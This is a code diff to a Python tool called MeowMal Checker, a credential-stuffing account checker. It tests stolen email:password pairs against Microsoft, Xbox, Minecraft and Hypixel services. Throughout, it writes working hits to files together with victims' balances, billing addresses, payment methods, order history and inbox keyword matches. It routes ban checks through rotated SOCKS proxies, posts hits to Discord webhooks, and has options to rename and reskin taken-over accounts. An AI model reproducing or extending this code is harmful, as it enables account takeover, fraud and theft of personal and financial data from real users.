@@ -27,26 +27,23 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 warnings.filterwarnings('ignore')
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-_session_cache = {}
-def create_optimized_session(config=None):
-    cache_key = 'default'
-    if cache_key in _session_cache:
-        return _session_cache[cache_key]
-    session = requests.Session()
-    optimize_network = config.get('optimize_network', True) if config else True
-    pool_size = config.get('connection_pool_size', 100) if config else 100
-    if optimize_network:
-        adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=Retry(total=0, backoff_factor=0, status_forcelist=[]))
-    else:
-        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=Retry(total=1, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504]))
-    session.mount('http://', adapter)
-    session.mount('https://', adapter)
-    session.verify = False
-    if optimize_network:
-        session.headers.update({'Connection': 'keep-alive', 'Keep-Alive': 'timeout=30, max=1000'})
-    _session_cache[cache_key] = session
-    return session
+
 colorama_init(autoreset=False, strip=False)
+file_lock = threading.Lock()
+proxy_lock = threading.Lock()
+
+def write_dedupe(fname, filename, content):
+    with file_lock:
+        path = f'results/{fname}/{filename}'
+        if os.path.exists(path):
+            try:
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    if content.strip() in f.read():
+                        return
+            except: pass
+        with open(path, 'a', encoding='utf-8', buffering=1) as f:
+            f.write(content)
+
 def get_optimized_timeout(config=None):
     if config and config.get('optimize_network', True):
         return (3, 5)
@@ -315,7 +312,7 @@ class UIManager:
         self._cached_stats = {}
         self._cached_colors = None
         self._cached_ascii_logo = None
-        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0}
+        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0}
         self.start_time = None
         self._lock = threading.Lock()
     def reset_log_area(self):
@@ -324,7 +321,10 @@ class UIManager:
         self.clear_from_cursor()
         self.log_area_count = 0
     def clear_screen(self):
-        os.system('clear')
+        if os.name == 'nt':
+            os.system('cls')
+        else:
+            os.system('clear')
     def move_cursor_home(self):
         print('\x1b[H', end='')
     def clear_from_cursor(self):
@@ -352,10 +352,6 @@ class UIManager:
     def increment_stat(self, stat_name):
         if stat_name in self.stats:
             self.stats[stat_name] += 1
-        elif stat_name == 'banned':
-            pass
-        elif stat_name == 'unbanned':
-            pass
     def show_finished_screen(self, results_folder):
         self.clear_screen()
         elapsed = self._get_elapsed_time()
@@ -402,7 +398,7 @@ class UIManager:
                 self.logs = self.logs[-self.max_logs:]
             try:
                 if getattr(self, 'cui_initialized', False):
-                    log_start_line = getattr(self, 'log_start_line', max(15, self.height - 10))
+                    log_start_line = getattr(self, 'log_start_line', max(5, self.height - 25))
                     log_line = log_start_line + 2 + self.log_area_count
                     if log_line >= self.height - 2:
                         self.reset_log_area()
@@ -423,15 +419,21 @@ class UIManager:
         try:
             elapsed_str = self._get_elapsed_time()
             time_part = f'[{elapsed_str}]'
-            if capture_obj.banned and capture_obj.banned != 'False':
+            if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
+                status_part = '[Error]'
+                color = Fore.YELLOW
+            elif capture_obj.banned and capture_obj.banned != 'False':
                 status_part = '[Banned]'
                 color = Fore.RED
-            else:
+            elif capture_obj.banned == 'False':
                 status_part = '[Unbanned]'
-                if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
-                    color = Fore.CYAN
-                else:
-                    color = Fore.GREEN
+                color = Fore.GREEN
+            else:
+                status_part = '[Unknown]'
+                color = Fore.YELLOW
+            
+            if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
+                color = Fore.CYAN
             tags_part = ''
             if capture_obj.type:
                 type_upper = str(capture_obj.type).upper()
@@ -458,10 +460,37 @@ class UIManager:
             else:
                 user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
             account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
+            stats_parts = []
+            if hasattr(capture_obj, 'bwstars') and capture_obj.bwstars:
+                try:
+                     val = int(str(capture_obj.bwstars).replace(',', '').strip())
+                     if val > 0:
+                         stats_parts.append(f'BW: {capture_obj.bwstars}')
+                except:
+                     if str(capture_obj.bwstars) != '0':
+                         stats_parts.append(f'BW: {capture_obj.bwstars}')
+
+            if hasattr(capture_obj, 'swstars') and capture_obj.swstars and (str(capture_obj.swstars) not in ('N/A', '', '0')):
+                try:
+                     val = int(str(capture_obj.swstars).replace(',', '').strip())
+                     if val > 0:
+                         stats_parts.append(f'SW: {capture_obj.swstars}')
+                except:
+                     stats_parts.append(f'SW: {capture_obj.swstars}')
+            if hasattr(capture_obj, 'sbcoins') and capture_obj.sbcoins and (str(capture_obj.sbcoins) not in ('N/A', '', 'None')):
+                stats_parts.append(f'Sb_Coins: {capture_obj.sbcoins}')
+            if hasattr(capture_obj, 'sbnetworth') and capture_obj.sbnetworth and (str(capture_obj.sbnetworth) not in ('N/A', '', 'None')):
+                stats_parts.append(f'Sb_Networth: {capture_obj.sbnetworth}')
+            if hasattr(capture_obj, 'pitcoins') and capture_obj.pitcoins and (str(capture_obj.pitcoins) not in ('N/A', '', 'None')):
+                stats_parts.append(f'Pit_Coins: {capture_obj.pitcoins}')
+            
             stats_part = ''
-            if extra_stats:
+            stats_part = ''
+            if stats_parts:
+                stats_part = ' [Hypixel: ' + ', '.join(stats_parts) + ']'
+            elif extra_stats:
                 clean_stats = extra_stats.strip(' |')
-                stats_part = f' | {clean_stats}'
+                stats_part = f' [Hypixel: {clean_stats}]'
             final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
             colored_line = f'{color}{final_content}{Style.RESET_ALL}'
             self.add_log(colored_line, 'HIT')
@@ -699,6 +728,7 @@ def check_microsoft_account(session, email, password, config, fname):
     try:
         checker = MicrosoftChecker(session, email, password, config, fname)
         results = {}
+
         def check_balance():
             if config.get('check_microsoft_balance'):
                 balance = checker.check_balance()
@@ -706,8 +736,7 @@ def check_microsoft_account(session, email, password, config, fname):
                     try:
                         amount_str = re.sub('[^\\d\\.]', '', str(balance))
                         if amount_str and float(amount_str) > 0:
-                            with open(f'results/{fname}/Microsoft_Balance.txt', 'a', encoding='utf-8', buffering=1) as f:
-                                f.write(f'{email}:{password} | Balance: {balance}\n')
+                            write_dedupe(fname, 'Microsoft_Balance.txt', f'{email}:{password} | Balance: {balance}\n')
                             return ('balance', balance)
                     except Exception:
                         pass
@@ -716,8 +745,7 @@ def check_microsoft_account(session, email, password, config, fname):
             if config.get('check_rewards_points', True):
                 points = checker.check_rewards_points()
                 if points:
-                    with open(f'results/{fname}/Ms_Points.txt', 'a', encoding='utf-8', buffering=1) as f:
-                        f.write(f'{email}:{password} | Points: {points}\n')
+                    write_dedupe(fname, 'Ms_Points.txt', f'{email}:{password} | Points: {points}\n')
                     return ('rewards_points', points)
             return None
         def check_payment():
@@ -730,27 +758,25 @@ def check_microsoft_account(session, email, password, config, fname):
             if config.get('check_subscriptions'):
                 subs = checker.check_subscriptions()
                 if subs:
-                    with open(f'results/{fname}/Subscriptions.txt', 'a', encoding='utf-8', buffering=1) as f:
-                        f.write(f"{email}:{password} | Subs: {', '.join(subs)}\n")
+                    write_dedupe(fname, 'Subscriptions.txt', f"{email}:{password} | Subs: {', '.join(subs)}\n")
                     return ('subscriptions', subs)
             return None
         def check_orders():
             if config.get('check_orders') or config.get('check_purchase_history'):
                 orders = checker.check_order_history()
                 if orders:
-                    with open(f'results/{fname}/Order_History.txt', 'a', encoding='utf-8', buffering=1) as f:
-                        f.write(f'{email}:{password}\n')
-                        for order in orders:
-                            f.write(f'  - {order}\n')
-                        f.write('----------------------------------------\n')
+                    block = f'{email}:{password}\n'
+                    for order in orders:
+                        block += f'  - {order}\n'
+                    block += '----------------------------------------\n'
+                    write_dedupe(fname, 'Order_History.txt', block)
                     return ('orders', orders)
             return None
         def check_billing():
             if config.get('check_billing_address'):
                 addresses = checker.check_billing_address()
                 if addresses:
-                    with open(f'results/{fname}/Billing_Addresses.txt', 'a', encoding='utf-8', buffering=1) as f:
-                        f.write(f"{email}:{password} | Address: {'; '.join(addresses)}\n")
+                    write_dedupe(fname, 'Billing_Addresses.txt', f"{email}:{password} | Address: {'; '.join(addresses)}\n")
                     return ('billing_addresses', addresses)
             return None
         def check_inbox():
@@ -761,20 +787,31 @@ def check_microsoft_account(session, email, password, config, fname):
                     inbox_results = checker.check_inbox(keywords)
                     if inbox_results:
                         formatted_results = ', '.join([f'{k} {v}' for k, v in inbox_results])
-                        with open(f'results/{fname}/inboxes.txt', 'a', encoding='utf-8', buffering=1) as f:
-                            f.write(f'{email}:{password} | Inbox - {formatted_results}\n')
+                        write_dedupe(fname, 'inboxes.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                         return ('inbox_results', inbox_results)
             return None
-        with concurrent.futures.ThreadPoolExecutor(max_workers=7) as executor:
-            futures = [executor.submit(check_balance), executor.submit(check_rewards), executor.submit(check_payment), executor.submit(check_subs), executor.submit(check_orders), executor.submit(check_billing), executor.submit(check_inbox)]
-            for future in concurrent.futures.as_completed(futures):
-                try:
-                    result = future.result()
-                    if result:
-                        key, value = result
-                        results[key] = value
-                except Exception:
-                    pass
+        try:
+            check_balance()
+        except: pass
+        try:
+            check_rewards()
+        except: pass
+        try:
+            check_payment()
+        except: pass
+        try:
+            check_subs()
+        except: pass
+        try:
+            check_orders()
+        except: pass
+        try:
+            check_billing()
+        except: pass
+        try:
+            check_inbox()
+        except: pass
+        
         return results
     except (OSError, IOError, PermissionError) as e:
         return {'balance': None}
@@ -799,6 +836,7 @@ class ConfigLoader:
             return False
         try:
             self.config.read(self.config_file, encoding='utf-8')
+            self.update_config_schema()
             self.parse_all_sections()
             self._config_cache = self.settings.copy()
             self._cache_timestamp = current_time
@@ -807,7 +845,184 @@ class ConfigLoader:
             self.create_default_config()
             return False
     def create_default_config(self):
-        self.settings = {'max_retries': 2, 'timeout': 10, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
+        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
+        self.config = configparser.ConfigParser()
+        self.update_config_schema()
+        
+        with open(self.config_file, 'w', encoding='utf-8') as f:
+            self.config.write(f)
+        print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
+    def update_config_schema(self):
+        defaults = {
+            'General': {
+                'threads': '100',
+                'timeout': '15',
+                'max_retries': '4',
+                'use_proxies': 'False'
+            },
+            'Performance': {
+                'optimize_network': 'True',
+                'connection_pool_size': '100',
+                'dns_cache_enabled': 'True',
+                'keep_alive_enabled': 'True'
+            },
+            'Proxy': {
+                'Auto_Proxy': 'False',
+                'Proxy_Api': '',
+                'Request_Num': '3',
+                'Proxy_Time': '5',
+                'proxy_rotation': 'True',
+                'verify_ssl': 'False'
+            },
+            'Features': {
+                'check_xbox_game_pass': 'True',
+                'check_xbox_game_pass_ultimate': 'True',
+                'check_minecraft_ownership': 'True',
+                'check_minecraft_capes': 'True',
+                'check_optifine_cape': 'True',
+                'check_name_change': 'True',
+                'check_last_name_change': 'True',
+                'check_hypixel_rank': 'True',
+                'check_hypixel_level': 'True',
+                'check_hypixel_first_login': 'True',
+                'check_hypixel_last_login': 'True',
+                'check_hypixel_ban_status': 'True',
+                'check_bedwars_stars': 'True',
+                'check_skyblock_coins': 'True',
+                'check_skyblock_networth': 'True',
+                'check_payment': 'False',
+                'check_credit_cards': 'False',
+                'check_paypal': 'False',
+                'check_billing_address': 'False',
+                'check_subscriptions': 'False',
+                'check_purchase_history': 'False',
+                'check_microsoft_balance': 'False',
+                'check_reward_points': 'False',
+                'check_orders': 'False',
+                'check_payment_methods': 'False',
+                'check_email_access': 'True',
+                'check_two_factor': 'True'
+            },
+            'Inbox': {
+                'scan_inbox': 'False',
+                'inbox_keywords': 'steam, netflix, Crunchyroll',
+                'max_inbox_messages': '50',
+                'save_full_emails': 'False'
+            },
+            'BanChecking': {
+                'enable_ban_checking': 'True',
+                'hypixelban': 'True',
+                'use_ban_proxies': 'False'
+            },
+            'Data_Collection': {
+                'hypixel_name': 'True',
+                'hypixel_level': 'True',
+                'first_hypixel_login': 'True',
+                'last_hypixel_login': 'True',
+                'optifine_cape': 'True',
+                'minecraft_capes': 'True',
+                'email_access': 'True',
+                'hypixel_skyblock_coins': 'True',
+                'hypixel_bedwars_stars': 'True',
+                'hypixel_ban': 'True',
+                'name_change_availability': 'True',
+                'last_name_change': 'True',
+                'payment': 'False'
+            },
+            'File_Output': {
+                'save_hits': 'True',
+                'save_bad': 'True',
+                'save_valid_mail': 'True',
+                'save_2fa': 'True',
+                'save_banned': 'True',
+                'save_unbanned': 'True',
+                'save_mfa': 'True',
+                'save_sfa': 'True',
+                'save_normal_minecraft': 'True',
+                'save_xbox_game_pass': 'True',
+                'save_xbox_game_pass_ultimate': 'True',
+                'save_other': 'True',
+                'create_capture_file': 'True',
+                'create_separate_files': 'True'
+            },
+            'Discord': {
+                'enable_notifications': 'False',
+                'discord_webhook_url': '',
+                'webhook_username': 'MeowMal Checker',
+                'webhook_avatar_url': 'https://i.imgur.com/4M34hi2.png',
+                'notify_on_hit': 'True',
+                'notify_on_game_pass': 'True',
+                'notify_on_payment': 'False',
+                'notify_on_2fa': 'False',
+                'notify_on_mfa': 'True',
+                'notify_on_hypixel_rank': 'True',
+                'embed_color_hit': '#57F287',
+                'embed_color_xgp': '#3498DB',
+                'embed_thumbnail': 'True',
+                'embed_footer': 'True',
+                'embed_thumbnail_url': 'https://i.imgur.com/4M34hi2.png',
+                'embed_image_enabled': 'True',
+                'embed_image_template': 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'
+            },
+            'Security': {
+                'mark_mfa': 'True',
+                'mark_sfa': 'True'
+            },
+            'RateLimit': {
+                'delay_between_checks': '0',
+                'random_delay': 'True',
+                'min_delay': '0',
+                'max_delay': '2',
+                'respect_429': 'True',
+                'pause_on_429': '20',
+                'random_user_agent': 'True',
+                'warn_on_slow_check': 'False',
+                'slow_check_warn_seconds': '75'
+            },
+            'Filters': {
+                'min_hypixel_level': '0',
+                'min_bedwars_stars': '0',
+                'min_skyblock_coins': '0',
+                'min_account_balance': '0',
+                'require_payment_method': 'False',
+                'require_full_access': 'False',
+                'require_unbanned': 'False'
+            },
+            'AutoOps': {
+                'auto_set_name': 'False',
+                'custom_name_format': 'MeowMal_{random_letter}_{random_number}',
+                'auto_set_skin': 'False',
+                'skin_url': 'http://textures.minecraft.net/texture/example',
+                'skin_variant': 'classic'
+            },
+            'DonutSMP': {
+                'donut_stats': 'False',
+                'donut_api_key': ''
+            },
+            'UI': {
+                'show_live_logs': 'True',
+                'print_to_console': 'True',
+                'colored_output': 'True',
+                'verbose_mode': 'False',
+                'theme': 'blue'
+            }
+        }
+        updated = False
+        for section, options in defaults.items():
+            if not self.config.has_section(section):
+                self.config.add_section(section)
+                updated = True
+            for key, value in options.items():
+                if not self.config.has_option(section, key):
+                    self.config.set(section, key, str(value))
+                    updated = True
+        if updated:
+            try:
+                with open(self.config_file, 'w', encoding='utf-8') as f:
+                    self.config.write(f)
+                pass
+            except Exception as e:
+                print(f'{Fore.YELLOW}⚠ Could not update config schema: {e}{Fore.RESET}')
     def parse_all_sections(self):
         for section in self.config.sections():
             for key, value in self.config.items(section):
@@ -955,7 +1170,7 @@ class Capture:
         if hasattr(self, 'pitcoins') and self.pitcoins and (str(self.pitcoins) not in ('N/A', '', 'None')):
             stats_parts.append(f'Pit_Coins: {self.pitcoins}')
         tags_str = ''.join(tags)
-        stats_str = ' '.join(stats_parts) if stats_parts else ''
+        stats_str = ', '.join(stats_parts) if stats_parts else ''
         if self.hypixl and self.hypixl != 'N/A':
             user_display = self.hypixl
         else:
@@ -974,7 +1189,7 @@ class Capture:
                 elapsed_time = '[00:00:00]'
             capture_line = f'{elapsed_time} {capture_line}'
         if stats_str:
-            capture_line += f' | {stats_str}'
+            capture_line += f' [Hypixel: {stats_str}]'
         return capture_line
     def hypixel(self):
         global errors
@@ -1090,15 +1305,14 @@ class Capture:
                     mfa += 1
                     if config.get('mark_mfa', True):
                         rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                        with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
-                             f.write(f'{self.email}:{self.password}{rank_str}\n')
+                        with file_lock:
+                            with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
+                                 f.write(f'{self.email}:{self.password}{rank_str}\n')
                 except imaplib.IMAP4.error:
                     sfa += 1
                     self.access = 'False'
                     if config.get('mark_sfa', True):
-                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                        with open(f'results/{fname}/SFA.txt', 'a', encoding='utf-8') as f:
-                             f.write(f'{self.email}:{self.password}{rank_str}\n')
+                        write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
                 except Exception as e:
                     self.access = 'Unknown'
             except:
@@ -1269,9 +1483,10 @@ class Capture:
                         else:
                             stats_lines.append('banned: false')
                     if len(stats_lines) > 2:
-                        with open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8') as f:
-                            f.write('\n'.join(stats_lines))
-                            f.write('\n' + '=' * 50 + '\n')
+                        with file_lock:
+                            with open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8') as f:
+                                f.write('\n'.join(stats_lines))
+                                f.write('\n' + '=' * 50 + '\n')
                         if UI_ENABLED and ui:
                             ui.log_info(f'Donut SMP stats saved for {self.name}')
             elif response.status_code == 404:
@@ -1309,7 +1524,10 @@ class Capture:
             retries += 1
     def ban(self, session):
         global errors
-        if not MINECRAFT_AVAILABLE or not config.get('hypixelban'):
+        if not MINECRAFT_AVAILABLE:
+            self.banned = '[Error] pyCraft Missing'
+            return
+        if not config.get('hypixelban'):
             return
         try:
             auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
@@ -1317,6 +1535,25 @@ class Capture:
             tries = 0
             while tries < maxretries:
                 connection = Connection('alpha.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
+                
+                original_handle_exception = connection._handle_exception
+                def safe_handle_exception(e, exc_info):
+                    try:
+                        error_str = str(e)
+                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and e.winerror == 10053):
+                            return
+                        if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
+                            return
+                        if isinstance(e, ValueError) and "closed file" in error_str:
+                            return
+                        if 'InsufficientPrivilegesException' in error_str or '403' in error_str:
+                            self.banned = "[Error] Multiplayer Disabled / 403"
+                            return
+                    except:
+                        pass
+                    original_handle_exception(e, exc_info)
+                connection._handle_exception = safe_handle_exception
+
                 @connection.listener(clientbound_login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     try:
@@ -1329,21 +1566,12 @@ class Capture:
                                 self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                             except:
                                 self.banned = "Temporarily Banned"
-                            with open(f'results/{fname}/Banned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('banned')
                         elif 'Suspicious activity' in data_str:
                             try:
                                 ban_id = data['extra'][6]['text'].strip()
                                 self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Suspicious activity"
-                            with open(f'results/{fname}/Banned.txt', 'a') as f:
-                                rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                                f.write(f'{self.email}:{self.password}{rank_str}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('banned')
                         elif 'You are permanently banned from this server!' in data_str:
                             try:
                                 reason = data['extra'][2]['text'].strip()
@@ -1351,47 +1579,35 @@ class Capture:
                                 self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Banned"
-                            with open(f'results/{fname}/Banned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('banned')
                         elif 'The Hypixel Alpha server is currently closed!' in data_str:
                             self.banned = 'False'
-                            with open(f'results/{fname}/Unbanned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('unbanned')
                         elif 'Failed cloning your SkyBlock data' in data_str:
                             self.banned = 'False'
-                            with open(f'results/{fname}/Unbanned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('unbanned')
                         else:
                             extra_list = data.get('extra', [])
                             full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                             if not full_msg:
                                 full_msg = data.get('text', '')
                             self.banned = full_msg if full_msg else str(data)
-                            with open(f'results/{fname}/Banned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('banned')
                     except Exception as e:
                         self.banned = f"Error parsing ban: {str(e)}"
-                        with open(f'results/{fname}/Banned.txt', 'a') as f:
-                            f.write(f'{self.email}:{self.password}\n')
                         if UI_ENABLED and ui:
-                            ui.increment_stat('banned')
                             ui.log_error(f"Ban parse error: {e}")
+
+                @connection.listener(clientbound_play.DisconnectPacket, early=True)
+                def play_disconnect(packet):
+                    login_disconnect(packet)
+
                 def _mark_unbanned(packet_name):
-                    if self.banned == None:
+                    if self.banned is None:
                         self.banned = 'False'
-                        with open(f'results/{fname}/Unbanned.txt', 'a') as f:
-                            f.write(f'{self.email}:{self.password}\n')
                         if UI_ENABLED and ui:
-                            ui.increment_stat('unbanned')
                             ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
+                        def delayed_disconnect():
+                            time.sleep(1.0)
+                            connection.disconnect()
+                        threading.Thread(target=delayed_disconnect).start()
+
                 @connection.listener(clientbound_play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     _mark_unbanned('JoinGame')
@@ -1407,27 +1623,64 @@ class Capture:
                 @connection.listener(clientbound_play.RespawnPacket, early=True)
                 def respawn(packet):
                     _mark_unbanned('Respawn')
+
                 try:
-                    if len(banproxies) > 0:
-                        proxy = random.choice(banproxies)
-                        if '@' in proxy:
-                            atsplit = proxy.split('@')
-                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
-                        else:
-                            ip_port = proxy.split(':')
-                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
-                        socket.socket = socks.socksocket
-                    original_stderr = sys.stderr
-                    sys.stderr = StringIO()
                     try:
-                        connection.connect()
+                        if len(banproxies) > 0:
+                            with proxy_lock:
+                                proxy = random.choice(banproxies)
+                                if '@' in proxy:
+                                    atsplit = proxy.split('@')
+                                    socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
+                                else:
+                                    ip_port = proxy.split(':')
+                                    socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
+                                socket.socket = socks.socksocket
+                                
+                                original_stderr = sys.stderr
+                                sys.stderr = StringIO()
+                                try:
+                                    connection.connect()
+                                finally:
+                                    sys.stderr = original_stderr
+                        else:
+                            connection.connect()
+                        
                         c = 0
-                        while self.banned == None and c < 2000:
+                        while self.banned == None and c < 1000:
                             time.sleep(0.01)
                             c += 1
                         connection.disconnect()
-                    except (EOFError, ConnectionError, OSError, Exception):
+                    except:
                         pass
+
+                    if self.banned is None:
+                        self.banned = '[Error] Connection Timeout/No Packet'
+                    
+                    if self.banned:
+                        if str(self.banned).startswith('[Error]'):
+                            if tries < maxretries - 1:
+                                self.banned = None
+                                time.sleep(1)
+                                tries += 1
+                                continue
+                            else:
+                                if UI_ENABLED and ui:
+                                    ui.log_info(f'Error checking ban for {self.name}: {self.banned}')
+                                self.banned = None
+                                break
+
+                        if self.banned == 'False':
+                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('unbanned')
+                        else:
+                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('banned')
+                        break
+                    
+                    tries += 1
                     sys.stderr = original_stderr
                 except Exception:
                     pass
@@ -1666,25 +1919,41 @@ class Capture:
                 ui.log_error(f"Builder error: {e}")
             fullcapt = f"{self.email}:{self.password}"
             masked_capt = f"{self.email}:***"
+        
         try:
-            with open(f'results/{fname}/Hits.txt', 'a') as file:
-                rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                file.write(f'{self.email}:{self.password}{rank_str}\n')
-                with stats_lock:
-                    hits += 1
+            stats_text = fetch_meowapi_stats(self.name, self.uuid)
+            if stats_text:
+                sw = re.search(r'SW: (\d+)', stats_text)
+                if sw: self.swstars = sw.group(1)
+                
+                nw = re.search(r'NW: ([^ ]+)', stats_text)
+                if nw: self.sbnetworth = nw.group(1)
+                
+                purse = re.search(r'Purse: ([^ ]+)', stats_text)
+                if purse: self.sbcoins = purse.group(1)
+                
+                pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
+                if pit: self.pitcoins = pit.group(1)
+                
+                fullcapt = self.builder(mask_password=False, include_timestamp=False)
+                masked_capt = self.builder(mask_password=True, include_timestamp=True)
+        except Exception:
+            stats_text = None
+        try:
+            write_dedupe(fname, 'Hits.txt', f'{self.email}:{self.password}\n')
+            with stats_lock:
+                hits += 1
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f"Failed to write Hit: {e}")
             with stats_lock:
                  hits += 1
         try:
-            open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
+            with file_lock:
+                open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
         except:
             pass
-        try:
-            stats_text = fetch_meowapi_stats(self.name, self.uuid)
-        except Exception:
-            stats_text = None
+        pass
         if UI_ENABLED and ui:
             ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
         self.send_discord_webhook()
@@ -2141,15 +2410,36 @@ def checkmc(session, email, password, token, xbox_token):
         acctype = checkownership(checkrq.json())
         if acctype is None:
             return False
+        
+        name, uuid_str, capes_list = 'N/A', 'N/A', []
+        try:
+            profilerq = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
+            if profilerq.status_code == 200:
+                p_data = profilerq.json()
+                name = p_data.get('name', 'N/A')
+                uuid_str = p_data.get('id', 'N/A')
+                capes_data = p_data.get('capes', [])
+                for c in capes_data:
+                    if c.get('alias'): capes_list.append(c['alias'])
+        except:
+            pass
+            
+        capes_str = ', '.join(capes_list)
+        try:
+             capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
+             if 'Game Pass' not in acctype:
+                 capture.handle(session)
+        except Exception as e:
+             if UI_ENABLED and ui: ui.log_error(f"Capture error: {e}")
+
         if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
             with stats_lock:
                 xgpu += 1
             codes = []
-            with open(f'results/{fname}/XboxGamePassUltimate.txt', 'a') as f:
-                f.write(f'{email}:{password}\n')
-            if 'Normal' in acctype:
-                with open(f'results/{fname}/Normal.txt', 'a') as f:
-                    f.write(f'{email}:{password}\n')
+            with stats_lock:
+                xgpu += 1
+            codes = []
+            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
             try:
                 for _ in range(maxretries):
                     try:
@@ -2193,9 +2483,8 @@ def checkmc(session, email, password, token, xbox_token):
                                     offers = r.json()['offers']
                                     current_time = datetime.now(timezone.utc)
